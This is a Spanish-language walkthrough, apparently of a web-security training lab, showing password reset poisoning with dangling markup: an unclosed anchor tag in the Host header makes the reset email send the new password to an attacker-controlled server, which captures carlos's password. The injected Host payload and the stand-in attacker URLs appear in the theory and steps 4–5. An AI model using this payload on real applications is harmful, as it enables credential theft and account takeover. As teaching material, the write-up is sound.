# 📡 Poisoning de reset con markup colgante

## 📄 Descripción del laboratorio

Este laboratorio es vulnerable a una técnica avanzada de **password reset poisoning** utilizando **dangling markup** (markup colgante).

El usuario **carlos** hace clic descuidadamente en cualquier enlace que recibe por correo electrónico. Aprovecharemos este comportamiento para capturar su nueva contraseña y acceder a su cuenta.

Credenciales propias del laboratorio:

```
wiener:peter
```

Todos los correos enviados pueden consultarse desde el **Email client del Exploit Server**.

El objetivo es obtener la nueva contraseña generada para **carlos** y autenticarnos con ella.



## 📚 Teoría

### 📌 Dangling markup en correos HTML

Este laboratorio explota un fallo sutil en el manejo de HTML dentro de correos electrónicos.

Cuando un usuario solicita un reset de contraseña, la aplicación:

* no envía un token de recuperación
* genera directamente una **nueva contraseña**
* envía esa contraseña dentro del cuerpo del email

El correo tiene dos representaciones:

* una versión sanitizada usando **DOMPurify**
* una versión **raw HTML** accesible mediante _View raw_

La versión raw no está correctamente sanitizada.

### 📌 Construcción insegura del HTML del correo

La aplicación utiliza la cabecera `Host` para construir enlaces dentro del email.

Conceptualmente el backend genera algo similar a:

```
https://<Host>/path
```

El problema es que el valor de `Host`:

* se inserta directamente en el HTML
* no se escapa correctamente
* termina formando parte del contenido del email

Esto permite inyectar **HTML incompleto** dentro del correo.

### 📌 Ataque mediante dangling markup

El ataque consiste en introducir una etiqueta HTML **sin cerrar**, por ejemplo:

```
<a href="https://attacker.com/?
```

Cuando el navegador renderiza el email:

* intenta corregir el HTML mal formado
* todo el contenido posterior se incorpora dentro del atributo `href`

Si el correo contiene una línea como:

```
Your new password is: abc123XYZ
```

el navegador puede construir automáticamente una URL como:

```
https://attacker.com/?Your-new-password-is=abc123XYZ
```

Si esa URL apunta al servidor del atacante, la contraseña se enviará automáticamente mediante una petición HTTP.

Este ataque:

* no requiere JavaScript
* no requiere XSS
* solo aprovecha HTML mal formado y un valor `Host` no validado.



## 📝 Práctica

### 1️⃣ Analizar el flujo de recuperación de contraseña

Solicitamos un reset de contraseña para nuestro usuario:

```
wiener
```

Recibimos un correo con:

* una nueva contraseña generada
* un enlace para acceder al sitio

<img width="768" height="123" alt="image" src="https://github.com/user-attachments/assets/3bdfcc58-7489-4045-882d-8c6baccc8c9a" />
<br>
Abrimos la opción **View raw** del correo.

<img width="768" height="92" alt="image" src="https://github.com/user-attachments/assets/c08710ae-705a-46c9-a2f4-8d9f1f7890a4" />
<br>
Observamos que el HTML del mensaje utiliza directamente el valor de la cabecera `Host` para construir enlaces.



### 2️⃣ Probar manipulación básica de Host

Interceptamos la petición:

```http
POST /forgot-password
```

Modificamos la cabecera:

```http
Host: test.com
```



Resultado:

El servidor devuelve un error, pero el correo **sí se envía**.

Esto indica que el valor de `Host` se utiliza al generar el correo.



### 3️⃣ Confirmar que Host se refleja en el HTML

Probamos un valor con puerto:

```http
Host: ID-LAB.web-security-academy.net:1234
```



Solicitamos nuevamente el reset.

En el correo recibido observamos que el puerto aparece dentro del HTML.

<figure><img src="../../../.gitbook/assets/image (227).png" alt=""><figcaption></figcaption></figure>

Esto confirma que el valor de `Host` se inserta directamente en el contenido del email.



### 4️⃣ Inyectar markup colgante

Ahora introducimos un valor malicioso en la cabecera `Host`:

```http
Host: ID-LAB.web-security-academy.net:'<a href="https://EXPLOIT-SERVER-ID.exploit-server.net/?
```

Solicitamos nuevamente un reset de contraseña.

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

El correo generado ahora contiene HTML incompleto.

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

El navegador intenta corregir la estructura del documento y el resto del contenido del email pasa a formar parte del atributo `href`.

Entre ese contenido se encuentra la nueva contraseña generada.

<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>



### 5️⃣ Capturar la contraseña

Accedemos al **Exploit Server** y abrimos:

```
Access logs
```

Aparece una petición similar a:

```http
GET /?Your-new-password-is=abc123XYZ HTTP/1.1
```

La contraseña generada se ha enviado automáticamente en la URL.

<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>



### 6️⃣ Repetir el ataque contra carlos

Repetimos el mismo proceso pero solicitando el reset para:

```
username=carlos
```

Carlos recibe el correo malicioso y hace clic en el enlace.

El navegador envía la petición al **Exploit Server**.

En los logs aparece la nueva contraseña de **carlos**.

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>



### 7️⃣ Iniciar sesión como carlos

Accedemos al formulario de login e introducimos:

```
Username: carlos
Password: <contraseña capturada>
```

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

El acceso se concede correctamente.

El laboratorio se marca como completado.

<figure><img src="../../../.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>



### 8️⃣ Resultado

Mediante un ataque de **password reset poisoning con dangling markup** se ha conseguido:

* manipular el HTML del correo usando la cabecera `Host`
* inyectar una etiqueta HTML incompleta
* forzar que el navegador envíe la contraseña al servidor del atacante
* obtener la nueva contraseña de **carlos**
* iniciar sesión con su cuenta

✅ El laboratorio queda resuelto.
